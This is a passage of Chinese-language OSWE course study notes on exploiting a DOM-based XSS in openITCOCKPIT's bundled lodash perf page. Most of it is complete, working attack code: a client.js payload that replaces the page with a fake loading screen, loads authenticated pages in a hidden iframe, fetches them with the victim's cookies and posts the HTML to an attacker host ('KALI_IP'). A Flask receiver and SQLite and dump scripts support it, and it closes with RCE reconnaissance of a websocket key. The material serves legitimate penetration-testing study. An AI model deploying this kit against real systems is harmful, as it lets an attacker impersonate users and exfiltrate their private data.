在 package 中先搜尋 document object 的引用，直接搜尋 "document" 會產生大量誤報。因此搜尋 "document.write" 根據需要縮小或擴大搜尋範圍\
使用 grep /packages 目錄，並加上 -r 遞歸參數。 --include 僅搜尋 HTML
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit/package]
└─$ grep -r "document.write" ./ --include *.html
[2026-04-28 11:06:51] grep -r "document.write" ./ --include *.html
./lodash-3.9.3/perf/index.html:                 document.write('<script src="' + ui.buildPath + '"><\/script>');
./lodash-3.9.3/perf/index.html:                 document.write('<script src="' + ui.otherPath + '"><\/script>');
./lodash-3.9.3/perf/index.html:                                         document.write('<applet code="nano" archive="../vendor/benchmark.js/nano.jar"></applet>');
./lodash-3.9.3/test/index.html:                         document.write('<script src="' + ui.buildPath + '"><\/script>');
./lodash-3.9.3/test/index.html:                 document.write((ui.isForeign || ui.urlParams.loader == 'none')
./lodash-3.9.3/test/underscore.html:                    document.write(ui.urlParams.loader != 'none'
./lodash-3.9.3/test/backbone.html:                      document.write(ui.urlParams.loader != 'none'
```
![image](https://hackmd.io/_uploads/SyRM6S0a-e.png)
> 有四個直接寫入文件\
> ui object 中使用 `urlParams` keywords

查看 `/lodash-3.9.3/perf/index.html`
```html
<script src="./asset/perf-ui.js"></script>
<script>
        document.write('<script src="' + ui.buildPath + '"><\/script>');
</script>
<script>
        var lodash = _.noConflict();
</script>
<script>
        document.write('<script src="' + ui.otherPath + '"><\/script>');
</script>
```
使用了 document.write 函數載入腳本，來源是 `ui.otherPath` 和`ui.buildPath` 變數。若變數是使用者可控，就可以利用 DOM-based XSS

用 grep 來確定`ui.buildPath`的設定方式\
`="` 驗證中間是否有空格或其他分隔符號
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit/package]
└─$ grep -r "buildPath[[:space:]]*=" ./
[2026-04-29 04:54:46] grep -r "buildPath[[:space:]]*=" ./
./lodash-3.9.3/perf/asset/perf-ui.js:  ui.buildPath = (function() {
./lodash-3.9.3/test/asset/test-ui.js:  ui.buildPath = (function() {
```
![image](https://hackmd.io/_uploads/r1cDDryAWx.png)
>  `asset/perf-ui.js` 和 `asset/test-ui.js`

查看 perf-ui.js 並找到 buildPath
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit/package]
└─$ cat ./lodash-3.9.3/perf/asset/perf-ui.js
...
  /** The lodash build to load. */
  var build = (build = /build=([^&]+)/.exec(location.search)) && decodeURIComponent(build[1]);
...
  // The lodash build file path.
  ui.buildPath = (function() {
    var result;
    switch (build) {
      case 'lodash-compat':     result = 'lodash.compat.min.js'; break;
      case 'lodash-custom-dev': result = 'lodash.custom.js'; break;
      case 'lodash-custom':     result = 'lodash.custom.min.js'; break;
      case null:                build  = 'lodash-modern';
      case 'lodash-modern':     result = 'lodash.min.js'; break;
      default:                  return build;
    }
    return basePath + result;
  }());
...
```
ui.buildPath 設定在檔案尾段，如果條件都不成立，則 switch 語句預設傳回 build 變數的值\
build 變數設定來自 `location.search`（query string），使用正規表達式解析查詢字串，透過 `build="`

## Advanced XSS Exploitation
Exploitation 不只是利用 alert box，需要製定策略來提權
### What We Can and Can't Do
做不到 ❌:
- 讀 document.cookie（HttpOnly）
- 直接偷 session

可能利用 ✅：
- 在受害者瀏覽器執行 JS
- 以「受害者身份」發 request
- 讀取同源回應（SOP 允許）

在 `https://openitcockpit/login/login`可以得到 itnovum
的 cookie 
![image](https://hackmd.io/_uploads/rJsKKSyRbg.png)
> 雖然設定 HttpOnly，不能拿 cookie 但可以嘗試用 cookie
> - XSS ≠ steal cookie
> - XSS = impersonate user

SOP 允許來自同一來源的不同頁面進行通訊並共享資源。例如，SOP 允許執行在 `https://openitcockpit/js/vendor/lodash/perf/index.html` 上的 JavaScript 使用 [XMLHttpRequest (XHR)](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) 或 [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) 向https://openitcockpit/ 傳送請求並讀取 response

>[!Tip]
>🧠： XSS 位於 `https://openitcockpit/...`\
> 可以嘗試 `fetch("/admin")`
> > 且 cookie 自動帶上、response 可讀

可以利用 XSS 抓取已認證受害者有權訪問的主頁。頁面 load 完後 find/ XHR load 所有 link，將內容轉發回來。透過這種方式存取已認證用戶的資料\
⚠️：把 victim browser 當 proxy



雖然可以利用 [The Browser Exploitation Framework (BeEF)](https://beefproject.com/) 的一些 feature，但決定不採用 BeEF。(需要耗費人力開發新的 plugin 並配置 BeEF)

編寫自己的 application 包含三個 components：XSS payload script、SQLite6 database 以及  Flask7 API server 接收 XSS Payload\
除了這三個 components 之外，還有其他標準：
1. The XSS page must look convincing enough to ensure the victim won't leave the page.
2. Second, the content we scraped and stored in the database will be used to recreate the remote HTML files locally. We will create a separate script to dump the contents of the database.
3. The database script must be written in a way so that it can be imported and used in multiple scripts. This will save us time and ensure code can be reused.


### Writing to DOM
利用 Firefox Developer Tools 開始操作 DOM 顯示一個逼真的 openITCOCKPIT page

[環境範例]\
首先，將載入存在 XSS 漏洞的頁面（https://openitcockpit/js/vendor/lodash/perf/index.html） ，然後點擊 後，點選右上角的 "Deactivate Firebug" 按鈕防止消耗過多資源

使用 `Contol + Shift + k`(Mac) 開啟 Firefox console 輸入 JavaScript 測試結果\
![image](https://hackmd.io/_uploads/rJFrPHeCWe.png)
透過 document interface :
- `getElementByID` 和`getElementsByTagName` method 查詢 HTML elements 
- `innerHTML` property 變更 HTML 元素內容
- `createElement` method 建立新元素。

取得 `<body>`：
```
body = document.getElementsByTagName("body")[0]
```
![image](https://hackmd.io/_uploads/HyamFSxR-e.png)

讀取目前內容：
```
body.innerHTML
```
![image](https://hackmd.io/_uploads/BJ0UFBeAZg.png)

覆蓋整個頁面：
```
body.innerHTML = "<h1>CHW!</h1>"
```
![image](https://hackmd.io/_uploads/Bk0pYrxCbl.png)
> 可以把原本 lodash perf 頁面全部換
    
(以 https://chw41.github.io/ 為例較明顯)\
![image](https://hackmd.io/_uploads/rJeA_BxC-e.png)

>[!Note]
> **為什麼需要覆蓋頁面？**
> XSS link 可能長 `https://openitcockpit/js/vendor/lodash/perf/index.html?build=...`\
> 原本看起來不像 openITCOCKPIT 正常頁面，若 victim 看到奇怪的測試頁、Firebug、benchmark UI，很可能直接關掉。
> 👉🏻 用 XSS 做到：
> - 清掉原本頁面內容
> - 換成看起來像 openITCOCKPIT 的正常畫面
    
### Creating the Database
login page 讓 XSS 頁面看起來更逼真，但對於進一步利用漏洞並沒有太大幫助\
在設計與 victim 收發內容之前，需要先建立可以擷取和儲存資料的系統（可以是 user input 或 obtained victims' session），使用 SQLite DB

>[!Tip]
>**為什麼使用 SQLite?**\
>✔ 不用安裝 DB server\
>✔ 單一檔案（sqlite.db）\
>✔ 快速開發\
>✔ Python 原生支援

建立一個腳本來初始化資料庫並提供資料插入函數，且能夠從 command line 運行。此外利用 API server 用於匯出資料庫的腳本都應該能夠匯入資料庫腳本中的函數。允許導入腳本將使我們的程式碼更易於重複使用和組織。

腳本需要四個主要參數：建立資料庫、插入內容、獲取內容、列出內容的來源位置（URL）

使用 [argparse](https://docs.python.org/3/library/argparse.html) 來決定每個參數的操作\
建立 db.py :
```python
import sqlite3
import argparse
import os
```
定義 DB 的 filename，並編寫 arguments parser。可以在腳本直接執行時解析參數。當 Python 直接執行時，會將 ` __name__`變數設為 `__main__`:
```python
if __name__ == "__main__":
    database = r"sqlite.db"
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--create','-c', help='Create Database', action='store_true')
    group.add_argument('--insert','-i', help='Insert Content', action='store_true')
    group.add_argument('--get','-g', help='Get Content', action='store_true')
    group.add_argument('--getLocations','-l', help='Get all Locations', action='store_true')

    parser.add_argument('--location','-L')
    parser.add_argument('--content','-C')
    args = parser.parse_args()
```
> `if __name__ == "__main__"`: Reusable module 同一支程式有兩種用途\
> > - CLI mode: `python3 db.py --insert ... `
> > - 被其他程式 import: `from db import insert_content`

DB file 定義為 sqlite.db。接著需要解析參數，以便執行對應的函數\
腳本包含五個函數：`create_connection`、 `insert_content`、`create_db`、`get_content` 和 `get_locations`。但所有操作都需要建立資料庫連線
```python
    conn = create_connection(database)

    if (args.create):
        print("[+] Creating Database")
        create_db(conn)
    elif (args.insert):
        if(args.location is None and args.content is None):
            parser.error("--insert requires --location, --content.")
        else:
            print("[+] Inserting Data")
            insert_content(conn, (args.location, args.content))
            conn.commit()
    elif (args.get):
        if(args.location is None):
            parser.error("--get requires --location, --content.")
        else:
            print("[+] Getting Content")
            print(get_content(conn, (args.location,)))
    if (args.getLocations):
        print("[+] Getting All Locations")
        print(get_locations(conn))
```
> 建立資料庫連線後，會檢查是否有任何參數被調用

可以開始寫建立資料庫連線的函數\
function 接受一個檔案名稱作為參數，並將檔案將被傳給 `sqlite3.connect()` 函數以建立 connection
```python
def create_connection(db_file):
    conn = None
    try:
        conn = sqlite3.connect(db_file)
    except Error as e:
        print(e)
    return conn
```
資料庫連線後在資料庫中建立表格:
1. 一個自增的 integer 當作 primary key
2. URL location (來源)
3. blob 放 content form
```sql
CREATE TABLE IF NOT EXISTS content (
    id integer PRIMARY KEY,
    location text NOT NULL,
    content blob
);
```
利用腳本執行 SQL 指令在 `create_db` 函數中執行，接收資料庫連線並執行 ` CREATE TABLE`。如果執行失敗，列印錯誤訊息
```python
def create_db(conn):
    createContentTable="""CREATE TABLE IF NOT EXISTS content (
            id integer PRIMARY KEY,
            location text NOT NULL,
            content blob);"""
    try:
        c = conn.cursor()
        c.execute(createContentTable)
    except Error as e:
        print(e)
```
(完整 db.py)
```python=
#!/usr/bin/env python3

import sqlite3
import argparse
import os


DATABASE = "sqlite.db"


def create_connection(db_file):
    try:
        conn = sqlite3.connect(db_file)
        return conn
    except sqlite3.Error as e:
        print(e)
        return None


def create_db(conn):
    sql = """
    CREATE TABLE IF NOT EXISTS content (
        id INTEGER PRIMARY KEY,
        location TEXT NOT NULL,
        content BLOB
    );
    """
    try:
        c = conn.cursor()
        c.execute(sql)
        conn.commit()
    except sqlite3.Error as e:
        print(e)


def insert_content(conn, data):
    sql = """
    INSERT INTO content(location, content)
    VALUES(?, ?);
    """
    try:
        c = conn.cursor()
        c.execute(sql, data)
        return c.lastrowid
    except sqlite3.Error as e:
        print(e)
        return None


def get_content(conn, data):
    sql = """
    SELECT content FROM content
    WHERE location = ?;
    """
    try:
        c = conn.cursor()
        c.execute(sql, data)
        rows = c.fetchall()
        return rows
    except sqlite3.Error as e:
        print(e)
        return None


def get_locations(conn):
    sql = """
    SELECT id, location FROM content;
    """
    try:
        c = conn.cursor()
        c.execute(sql)
        rows = c.fetchall()
        return rows
    except sqlite3.Error as e:
        print(e)
        return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)

    group.add_argument("--create", "-c", help="Create database", action="store_true")
    group.add_argument("--insert", "-i", help="Insert content", action="store_true")
    group.add_argument("--get", "-g", help="Get content by location", action="store_true")
    group.add_argument("--getLocations", "-l", help="Get all locations", action="store_true")

    parser.add_argument("--location", "-L")
    parser.add_argument("--content", "-C")

    args = parser.parse_args()

    conn = create_connection(DATABASE)

    if conn is None:
        print("[-] Failed to connect to database")
        exit(1)

    if args.create:
        print("[+] Creating Database")
        create_db(conn)

    elif args.insert:
        if args.location is None or args.content is None:
            parser.error("--insert requires --location and --content")
        print("[+] Inserting Data")
        insert_content(conn, (args.location, args.content))
        conn.commit()

    elif args.get:
        if args.location is None:
            parser.error("--get requires --location")
        print("[+] Getting Content")
        print(get_content(conn, (args.location,)))

    elif args.getLocations:
        print("[+] Getting All Locations")
        print(get_locations(conn))

    conn.close()
```
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ python3 db.py --create
[2026-04-30 05:17:19] python3 db.py --create
[+] Creating Database
```
![image](https://hackmd.io/_uploads/H15VR5lCWl.png)\
測試插入資料：\
![image](https://hackmd.io/_uploads/rJ5K0qlA-g.png)\
列出已收集的 URL：\
![image](https://hackmd.io/_uploads/H1I30cgCbl.png)\
取回 URL 的內容：\
![image](https://hackmd.io/_uploads/B14RRceA-g.png)

### Creating the API
已完成 DB script，接著要收集 user Broswer 發送的資料並儲存在剛建立的 SQLite DB 中\
使用 Flask 建立 API Server 檔案命為 api.py，也會從剛建立的 db.py 和 flask_cors 模組中導入一些 function

選擇 Flask framework 是因為易於上手且不用大量配置。 Flask extensions（例如 flask_cors）無需寫大量程式碼即可擴展 web application 的功能\
接著使用 flask_cors 擴充功能來發送 CORS header:
```python
from flask import Flask, request, send_file
from db import create_connection, insert_content, create_db
from flask_cors import CORS
```
接著定義 Flask app 和 CORS extension。因為我們用 XSS 呼叫此 API Server，所以還需要設定 Cross-Origin Resource Sharing(CORS) Header\
CORS header instructs 瀏覽器允許 XHR requests 存取其他來源。對於上述發現的 XSS，希望 instructs 瀏覽器允許 XSS payload 連接到 API Server\
最後需要定義正在使用的資料庫檔案
```python
app = Flask(__name__)
CORS(app)
database = r"sqlite.db"
```
> - `CORS (app)` cmd 用於設定 CORS Header

透過 app.run 啟動 Web Server。但是由於 openITCOCKPIT 在 HTTPS 協定下，需要將 Flask 運行在 443 port，並產生一個自簽憑證和金鑰，且 Firefox 要設定為接受 Kali 的 IP 位址。

![image](https://hackmd.io/_uploads/rklhS6eAWg.png)

certificate 和 key 產生後載入到 API application 中，並指定要執行的主機和連接埠
```python
app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```

Flask 伺服器已經可以運行，接著需要建立 endpoints:
第一個 endpoint 要回傳 client.js 的內容 （XSS payload），使用 Python [decorator](https://hackersandslackers.com/flask-routes/#defining-routes) 設定路由。具體來說，我們將設定路由名稱和允許的 GET 請求方法。所以用 Flask 的 `send_file` 傳送 client.js file
```python
@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')
```
(完整 api.py)
```python=
#!/usr/bin/env python3

from flask import Flask, request, send_file
from flask_cors import CORS
from db import create_connection, insert_content, create_db

app = Flask(__name__)
CORS(app)

database = "sqlite.db"


@app.route("/client.js", methods=["GET"])
def clientjs():
    print("[+] Sending Payload")
    return send_file("./client.js", mimetype="application/javascript")


@app.route("/store", methods=["POST"])
def store():
    url = request.form.get("url")
    content = request.form.get("content")

    if url is None or content is None:
        return "Missing url or content", 400

    conn = create_connection(database)
    create_db(conn)

    insert_content(conn, (url, content))
    conn.commit()
    conn.close()

    print(f"[+] Stored content from: {url}")
    return "OK", 200


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=443,
        ssl_context=("cert.pem", "key.pem")
    )
```
![image](https://hackmd.io/_uploads/rkhZj6gRbg.png)

### Scraping Content
現在有了用於發送資料的 Web Server 和儲存資料的 DB，接著需要完成client.js 腳本，腳本會針對已認證的目標用戶，抓取 user 有權訪問的資料\
除了將 DOM 替換為先前建立的偽造登入頁面外，還需要執行四個步驟：
1. 載入首頁
2. 尋找所有唯一連結並儲存它們的 href 屬性
3. 取得每個連結的內容。
4. 將連結所得到的內容傳送到 API Server

```
XSS 觸發
  ↓
塞一個隱藏 iframe 載入 openITCOCKPIT 首頁
  ↓
等待 JS 完整渲染
  ↓
抓 iframe 裡所有 <a href="">
  ↓
去重、過濾 logout
  ↓
用 victim session fetch 每個頁面
  ↓
把 HTML POST 回你的 Flask API
  ↓
存進 SQLite
```

目前不知道已認證使用者的首頁 URL，🥚 未認證使用者存取根目錄會被 302 到 /login，可以假設若存在 session，應用程式會 302 到已認證頁面\
雖然目前使用 XHR requests 取得連結內容，但不希望在首頁上使用 XHR requests，因為不確定首頁上的 JS 是否會向 DOM 添加其他連結。\
因此使用 iframe 能夠載入頁面、追蹤任何重定向並渲染所有 JavaScript 程式碼。頁面完全載入後，就可以取得已認證使用者有權存取的所有連結

在現有的 client.js 程式碼下方新增 JavaScript  code 建立一個全頁 iframe element，設定 onload 事件，並將頁面來源設定為 openITCOCKPIT 根目錄:
```javascript
var iframe = document.createElement('iframe');
iframe.setAttribute("style","display:none")
iframe.onload = actions;
iframe.width = "100%"
iframe.height = "100%"
iframe.src = "https://openitcockpit"

body = document.getElementsByTagName('body')[0];
body.appendChild(iframe)
```
> - `display:none` 隱藏頁面載入過程，即使 iframe 沒有顯示，瀏覽器仍會載入頁面
> - L3 引用目前不存在的 actions function 是一個回呼函數，定義頁面載入時要執行的動作:
> >等待五秒以確保所有內容完全加載並添加到 DOM 中

```javascript
function actions(){
    setTimeout(function(){ getContent() }, 5000);
}
```

在 `getContent()` 函數中，從 iframe 獲取所有`<a>` elements，從中提取所有`<a>`元素的 `href` TAG，移除所有重複鏈接，並檢查 `href` URL 的有效性\
當取得所有`<a>` 元素後， `getElementsByTagName` 函數將傳回一個 `HTMLCollection` 物件。為了進行後續處理須將 `HTMLCollection` 轉換為陣列：
```javascript
allA = iframe.contentDocument.getElementsByTagName("a")

allHrefs = []
for (var i=0; i<allA.length; i++){
    allHrefs.push(allA[i].href)
}
```
確保 array 中只包含唯一值以減少發送流量。目前用於 XSS 的函式庫 lodash 有個 `unique` 函數可以處理這個問題:\
使用底線(_) 將 allHrefs array 傳遞給 unique 函數，並將輸出保存到uniqueHrefs
```javascript
uniqueHrefs = _.unique(allHrefs)
```
現在有了所有唯一 href 的列表，需要檢查 href 是否是有效的 URL，並移除任何可能導致當前用戶登出的連結:\
建立一個新 array 用於儲存有效的 URL。接著遍歷 uniqueHrefs 列表將每個 href 傳遞給函數 validURL 檢查 URL 有效性，同時驗證是否會導致用戶登出
```javascript
validUniqueHrefs = []
for(var i=0; i<uniqueHrefs.length; i++) {
    if (validURL(uniqueHrefs[i])){
        validUniqueHrefs.push(uniqueHrefs[i]);
    }
}
```
接著將每個有效且唯一的 href 發送 GET 請求，對內容進行編碼，然後將內容傳送到 API Server，使用 fetch method 來發出請求。

遍歷每個有效的唯一 href 並取得其內容。其中不希望用戶的瀏覽器卡頓，將請求作為非同步運行。使用 fetch 方法的原因是它會回傳一個 JavaScript [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)。 Promise 用於處理 asynchronous operations，不會在程式碼執行期間阻塞整個。\
fetch 請求傳回的 Promise 會由 `.then` 函數處理，並將回應作為參數傳遞給該函數。從回應中取得文字（該回應會傳回另一個 Promise），並將其傳遞給另一個`.then`函數。在最後一個`.then` 函數中，該文字將與來源 URL 一起傳送到 API 伺服器：

```javascript
validUniqueHrefs.forEach(href =>{
    fetch(href, {
        "credentials": "include",
        "method": "GET",
    })
    .then((response) => {
      return response.text()
    })
    .then(function (text){
      fetch("https://{Kali IP}/content", {
        body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
      })
    });
})
```
完整 client.js : 
```javascript
var attacker = "https://KALI_IP";

document.body.innerHTML = `
<div style="font-family: Arial, sans-serif; width: 420px; margin: 90px auto;">
  <h2>openITCOCKPIT</h2>
  <p>Loading application, please wait...</p>
</div>
`;

function validURL(url) {
  try {
    var parsed = new URL(url);
    var href = parsed.href.toLowerCase();

    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
      return false;
    }

    if (
      href.includes("logout") ||
      href.includes("log-out") ||
      href.includes("signout") ||
      href.includes("sign-out")
    ) {
      return false;
    }

    return true;
  } catch (e) {
    return false;
  }
}

function sendContent(url, content) {
  fetch(attacker + "/content", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body:
      "url=" + encodeURIComponent(url) +
      "&content=" + encodeURIComponent(content)
  });
}

function getContent() {
  var allA = iframe.contentDocument.getElementsByTagName("a");

  var allHrefs = [];
  for (var i = 0; i < allA.length; i++) {
    allHrefs.push(allA[i].href);
  }

  var uniqueHrefs = _.unique(allHrefs);

  var validUniqueHrefs = [];
  for (var j = 0; j < uniqueHrefs.length; j++) {
    if (validURL(uniqueHrefs[j])) {
      validUniqueHrefs.push(uniqueHrefs[j]);
    }
  }

  validUniqueHrefs.forEach(function(href) {
    fetch(href, {
      credentials: "include",
      method: "GET"
    })
    .then(function(response) {
      return response.text();
    })
    .then(function(text) {
      sendContent(href, text);
    })
    .catch(function(e) {});
  });
}

function actions() {
  setTimeout(function() {
    getContent();
  }, 5000);
}

var iframe = document.createElement("iframe");
iframe.setAttribute("style", "display:none");
iframe.onload = actions;
iframe.width = "100%";
iframe.height = "100%";
iframe.src = "https://openitcockpit";

var body = document.getElementsByTagName("body")[0];
body.appendChild(iframe);
```
### Dumping the Contents
目前已經擁有已認證使用者內容的資料庫。下一步將這些資料匯出到易於管理的文件中：建立 Python 腳本匯入並擴充到 db.py 腳本中

建立 dump.py 檔案，導入所有必要的函式庫和模組，需要 os 函式庫來寫入文件，也需要 db.py 中的 `create_connection`、`get_content`和 `get_locations` 函式來取得文件內容
```python
import os
from db import create_connection, get_content, get_locations

database = r"sqlite.db"
contentDir = os.getcwd() + "/content"
```
開始建立腳本的主體: 首先需要建立資料庫連線並查詢所有位置。對於每個位置，我們查詢其內容並將其寫入相應的文件
```python
if __name__ == '__main__':
    conn = create_connection(database)
    locations = get_locations(conn)
    for l in locations:
        content = get_content(conn, l)
        write_to_file(l[0], content)
```
最後完成 `write_to_file` 函數將每個位置的內容儲存到一個 HTML 檔案中。若包含子目錄，則必須將其儲存在與子目錄同名的資料夾中
```python
def write_to_file(url, content):
    fileName = url.replace('https://','')
    if not fileName.endswith(".html"):
        fileName = fileName + ".html"
    fullname = os.path.join(contentDir, fileName)
    path, basename = os.path.split(fullname)
    if not os.path.exists(path):
        os.makedirs(path)
    with open(fullname, 'w') as f:
        f.write(content)
```
完整 dump.py：
```python
#!/usr/bin/env python3

import os
from db import create_connection, get_content, get_locations

database = "sqlite.db"
contentDir = os.getcwd() + "/content"


def normalize_content(content_rows):
    if not content_rows:
        return ""

    first = content_rows[0]

    if isinstance(first, tuple):
        data = first[0]
    else:
        data = first

    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")

    return str(data)


def write_to_file(url, content):
    fileName = url.replace("https://", "").replace("http://", "")

    fileName = fileName.split("?")[0]

    if fileName.endswith("/"):
        fileName += "index.html"
    elif not fileName.endswith(".html"):
        fileName += ".html"

    fullname = os.path.join(contentDir, fileName)
    path, basename = os.path.split(fullname)

    if not os.path.exists(path):
        os.makedirs(path)

    with open(fullname, "w", encoding="utf-8", errors="replace") as f:
        f.write(content)

    print(f"[+] Wrote: {fullname}")


if __name__ == "__main__":
    conn = create_connection(database)

    if conn is None:
        print("[-] Failed to connect to database")
        exit(1)

    locations = get_locations(conn)

    for item in locations:
        if len(item) >= 2:
            url = item[1]
        else:
            url = item[0]

        content_rows = get_content(conn, (url,))
        content = normalize_content(content_rows)

        write_to_file(url, content)

    conn.close()
```
目前腳本用途
- db.py        → 負責「資料庫操作」
- dump.py      → 負責「讀 DB → 還原成檔案」
- api.py       → 負責「接收資料 → 寫進 DB」

## RCE Hunting
現在可存取已認證使用者的內容，開始尋找能夠執行系統指令的線索
### Discovery
漏洞發現流程並非自動化，且可能非常耗時。可以尋找一些能夠觸發 hacker-senses 的關鍵字來加快這個過程\
Ex. 從 victim 獲取的 commands.html、cronjobs.html 和 serviceescalations.html 等檔案名稱暗示可能允許存取系統

環境變數中 `content/openitcockpit/commands.html` 包含一個名為appData 的 object
```html
var appData = {"jsonData":{"isAjax":false,"isMobile":false,"websocket_url":"wss:\/\/openitcockpit\/sudo_server","akey":"1fea123e07f730f76e661bced33a94152378611e"},"webroot":"https:\/\/openitcockpit\/","url":"","controller":"Commands","action":"index","params":{"named":[],"pass":[],"plugin":"","controller":"commands","action":"index"},"Types":{"CODE_SUCCESS":"success","CODE_ERROR":"error","CODE_EXCEPTION":"exception","CODE_MISSING_PARAMETERS":"missing_parameters","CODE_NOT_AUTHENTICATED":"not_authenticated","CODE_AUTHENTICATION_FAILED":"authentication_failed","CODE_VALIDATION_FAILED":"validation_failed","CODE_NOT_ALLOWED":"not_allowed","CODE_NOT_AVAILABLE":"not_available","CODE_INVALID_TRIGGER_ACTION_ID":"invalid_trigger_action_id","ROLE_ADMIN":"admin","ROLE_EMPLOYEE":"employee"}};
```
> "websocket_url":"wss:\/\/openitcockpit\/sudo_server","akey":"1fea123e07f730f76e661bced33a94152378611e"
>> 1. 定義名為「websocket_url」的 URL，以「sudo_server」結尾
>> 2. 定義了名為「akey」的鍵，其值 `1fea123e07f730f76e661bced33a94152378611e`

[WebSocket](https://en.wikipedia.org/wiki/WebSocket) 是一種瀏覽器支援的通訊協議，使用 HTTP 建立初始連接，但隨後會建立 full-duplex 連線，從而實現 client 和 server 之間的快速通訊。\
初始 HTTP 連線會驗證使用者身份，之後的 WebSocket 請求都不需要身份驗證。在 openITCOCKPIT 中，可以看到在同一個物件中設定了websocket_url ，並且還提供了一個金鑰 (很有可能用於身份驗證)

在基於瀏覽器的應用程式中，WebSocket 連線是透過 JavaScript 發起的。由於 JavaScript 不會被編譯，因此定義 WebSocket 連線的 source code 必須在此頁面載入的某個 JavaScript 檔案\
🧠：可以利用這些文件來學習如何與 WebSocket 伺服器通訊並建立自己的 client

commands.html 載入了很多 JavaScript file，大多數是 plugins 和 libraries。其中一組 JavaScript 檔案似乎沒有載入 plugins 或 libraries：
```html
<script src="/vendor/angular/angular.min.js"></script><script src="/js/vendor/vis-4.21.0/dist/vis.js"></script><script src="/js/scripts/ng.app.js"></script><script src="/vendor/javascript-detect-element-resize/jquery.resize.js"></script><script src="/vendor/angular-gridster/dist/angular-gridster.min.js"></script><script src="/js/lib/angular-nestable.js"></script><script src="/js/compressed_angular_services.js"></script><script src="/js/compressed_angular_directives.js"></script><script src="/js/compressed_angular_controllers.js"></script>
```
從清單可以看出，自訂 JavaScript 儲存在 js 資料夾中。搜尋所有設定了src set 的 script 標籤，並刪除 vendor、 plugin 或 lib 資料夾中的所有 entries：
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ cat commands.html | grep -E "script.*src" | grep -Ev "vendor|lib|plugin"
<script type="text/javascript" src="/js/app/app_controller.js?v3.7.2"></script>
<script type="text/javascript" src="/js/compressed_components.js?v3.7.2"></script>
<script type="text/javascript" src="/js/compressed_controllers.js?v3.7.2"></script>
</script><script type="text/javascript" src="/frontend/js/bootstrap.js?v3.7.2"></script>
        <script type="text/javascript" src="/js/app/bootstrap.js?v3.7.2"></script>
        <script type="text/javascript" src="/js/app/layoutfix.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/notification/SmartNotification.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/demo.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/app.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/smartwidgets/jarvis.widget.js?v3.7.2"></script>
```
smartadmin 資料夾是一個 openITCOCKPIT theme（透過 Google 搜尋可以得知），因此也刪除\
最終的自訂 JavaScript 檔案清單儲存 `~/scripts/content/custom_js/list.txt` 檔案中
```
┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ cat list.txt
https://openitcockpit/js/app/app_controller.js
https://openitcockpit/js/compressed_components.js
https://openitcockpit/js/compressed_controllers.js
https://openitcockpit/frontend/js/bootstrap.js
https://openitcockpit/js/app/bootstrap.js
https://openitcockpit/js/app/layoutfix.js
https://openitcockpit/js/compressed_angular_services.js
https://openitcockpit/js/compressed_angular_directives.js
https://openitcockpit/js/compressed_angular_controllers.js
```
client 端的 JavaScript 檔案很少會受到身份驗證的保護。因此，嘗試能夠在無需身份驗證的情況下取得這些文件。我們將使用wget將自訂 JavaScript 檔案清單下載到custom_js資料夾：

```
┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ wget --no-check-certificate -q -i list.txt

┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ ls
app_controller.js  compressed_angular_controllers.js  compressed_components.js   list
bootstrap.js       compressed_angular_directives.js   compressed_controllers.js
bootstrap.js.1     compressed_angular_services.js     layoutfix.js
```

使用 [js-beautify](https://github.com/beautifier/js-beautify) Python 腳本美化這些檔案：
```
┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$  sudo pip3 install jsbeautifier
...
Successfully built jsbeautifier editorconfig
Installing collected packages: editorconfig, jsbeautifier
Successfully installed editorconfig-0.12.2 jsbeautifier-1.10.3

┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ mkdir pretty

┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ for f in compressed_*.js; do js-beautify $f > pretty/"${f//compressed_}"; done;
```
### Reading and Understanding the JavaScript

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSWE, WEB-300] Instructional notes - Part 4](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-4/)

# [Link to: "[OSWE, WEB-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-4/)    
# [Link to: "[OSWE, WEB-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-5/)
# [Link to: "[OSWE, WEB-300] Instructional notes - Part 6"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-6/)

